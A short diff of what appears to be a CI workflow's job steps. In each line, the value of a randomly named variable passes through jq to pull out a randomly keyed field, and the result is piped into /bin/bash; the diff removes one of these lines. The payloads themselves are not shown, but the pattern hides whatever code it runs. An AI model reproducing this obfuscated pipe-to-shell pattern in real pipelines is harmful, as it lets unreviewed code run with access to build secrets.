@@ -38,7 +38,6 @@ jobs:
           echo $muaz120 | jq -r .i29046 | /bin/bash
           echo $doiyy32495 | jq -r .nbne97 | /bin/bash
           printf '%s' "$lv88718" | jq -r .nwon82605 | /bin/bash
-          echo $duhhp23737 | jq -r .xbup8 | /bin/bash
           echo $nvsiy6172 | jq -r .sacdr782 | /bin/bash
           echo $nk12 | jq -r .tyr29750 | /bin/bash
 
